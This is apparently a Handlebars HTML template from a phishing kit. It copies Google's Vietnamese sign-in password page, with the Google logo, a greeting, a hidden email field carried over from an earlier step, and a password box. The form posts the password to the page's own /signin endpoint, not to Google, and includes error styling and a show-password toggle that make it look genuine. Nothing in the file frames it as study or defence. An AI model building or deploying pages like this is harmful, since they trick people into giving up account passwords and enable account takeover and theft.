<form action="/signin" method="POST">
    <div class="maindiv">
        <div class="click-out">
            <img src="img/google.png" alt="Google">
            <h2 style=" margin-bottom:10px; margin-top:10px"><span style="font-weight: 100;0">Chào mừng</span></h2>
            <div style="line-height: 30px;    display: inline-block;max-width: 100%;">
                <div style="display: flex;padding: 0 7px;justify-content: center;border:1px solid #202124; border-radius:16px; font-weight: 400;
    letter-spacing: 0.25px;
    max-width: 100%;
    position: relative;color: #000407;
    cursor: pointer;">
                    <img style="height: 22px;width:22px; margin-top: 5px;margin-right: 5px" src="img/icon-user.png">
                    <div>{{oldInput.email}}</div>
                    <img style="height: 22px;width:22px;margin-top: 5px; margin-left: 5px" src="img/xuong.png" alt="">
                </div>
            </div>
        </div>
        <div class="inputs">
            <div class="Fields">
                <div class="Fieldset" style="margin-top: 35px;">
                    <input type="hidden" name="email" value="{{oldInput.email}}">
                    <input type="password" id="password" class="Before-FS" name="password" value="" required=""
                        autocomplete="off">
                    <div class="FsH"><span class="span-email">Nhập mật khẩu của bạn</span></div>
                    <label class="placeholder" style="top:54px">Nhập mật khẩu của bạn</label>
                    {{#if errorMessage}}
                    <script>
                        document.getElementsByClassName("Before-FS")[0].style.border = '2px solid #D93025'
                        //document.getElementsByClassName("Before-FS")[0].style.borderTop = 'none'
                        spanEmail = document.getElementsByClassName('span-email')[0].style.color = '#D93025'
                        document.getElementsByClassName("FsH")[0].classList.add("error_FsH")
                        let form_email = document.getElementsByClassName("Before-FS")[0]
                        let error_FsH = document.getElementsByClassName('error_FsH')[0]

                        form_email.onclick = function () {
                            error_FsH.style.display = 'block'
                            error_FsH.style.color = '#1a73e8'
                        }
                    </script>

                    <div class="user-message-error" style="display: flex; text-align:left;margin-top: 5px">
                        <img src="img/chu-y.png" alt="" style="height: 21px;">
                        <div style="font-size: 13px; color: #D93025; padding-top: 3px; margin-bottom: 5px">
                            {{errorMessage}}
                        </div>
                    </div>
                    {{/if}}
                </div>
                <div class="div-check click-out" style="display: flex;float: left; margin-top:10px">
                    <input id="hien_mk" type="checkbox" style="transform: scale(1.3, 1.3);">
                    <label style="  padding-top: 3px; font-size: 15px" for="hien_mk">Hiện mật
                        khẩu</label>
                </div>
            </div>

            <div class="create-next next-signin" style="text-align: left; display:flex; margin-top: 50px">
                <div class="create-user"
                    style="padding-top: 7px; font-size: 14.5px; margin-left: -20px; font-weight: 500;">
                    <a style="color:#1a73e8;font-weight: 600"
                        href="https://accounts.google.com/signup/v2/webcreateaccount?biz=false&cc=VN&continue=http%3A%2F%2Fsupport.google.com%2Fmail%2Fanswer%2F56256%3Fhl%3Dvi&dsh=S2131666562%3A1679745005834027&flowEntry=SignUp&flowName=GlifWebSignIn&hl=vi&ifkv=AQMjQ7STrTWhSvt6HIh3CmjYJeobmF25afB5GeeQaitU9hle2-EPYFC0_dbDTQHJvBtXjNXPy-S6-g">
                        Bạn quên mật khẩu?
                    </a>
                </div>
                <div class="next">
                    <button class="btn-next" style="margin-left: 115px;" type="submit">Tiếp theo</button>
                </div>

            </div>

        </div>
    </div>
</form>


<script>
    let tab_checkbox = document.getElementById('hien_mk');
    let password = document.getElementById('password');
    tab_checkbox.onclick = function () {
        password.type = password.type == 'text' ? 'password' : 'text';
    };

    function clickOut() {
        document.getElementsByClassName('FsH')[0].style.display = 'none';
        document.getElementsByClassName('Before-FS')[0].style.borderWidth = '1px';
    }
    document.getElementsByClassName("click-out")[0].onclick = clickOut
    document.getElementsByClassName("click-out")[1].onclick = clickOut

    document.getElementsByClassName("Before-FS")[0].onclick = function () {
        document.getElementsByClassName('FsH')[0].style.display = 'block'
        document.getElementsByClassName('FsH')[0].style.color = '#1a73e8'
        document.getElementsByClassName('Before-FS')[0].style.borderWidth = '2px';
    }

</script>
